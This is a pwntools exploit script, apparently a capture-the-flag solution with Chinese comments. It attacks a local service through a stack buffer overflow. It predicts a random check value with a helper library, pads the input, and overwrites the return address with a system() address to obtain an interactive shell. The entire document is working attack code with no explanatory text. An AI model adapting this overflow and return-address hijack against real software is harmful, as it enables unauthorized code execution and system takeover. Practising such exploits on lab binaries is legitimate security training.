from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",46485)          
# elf = ELF("./pwn")
# libc = ELF("./libc.so.6")

io.recvuntil("Do you want to brute-force this system? (y/n)")
io.sendline('y')

lib = ctypes.CDLL('./1.so')
lib.randd.restype = ctypes.c_int
lib.init()
u = lib.randd()
log.info(f"Generated random number: {u}")

system_addr = 0x000000000040127E
main_addr= 0x00000000004012EE
ret = 0x000000000040101a
io.recvuntil("Enter your message: ")
payload = (0x90 - 0x14) * b'A' + p32(u) + b'a'* (0x10 + 8)+ p64(system_addr) + p64(main_addr)
io.sendline(payload)
io.interactive()                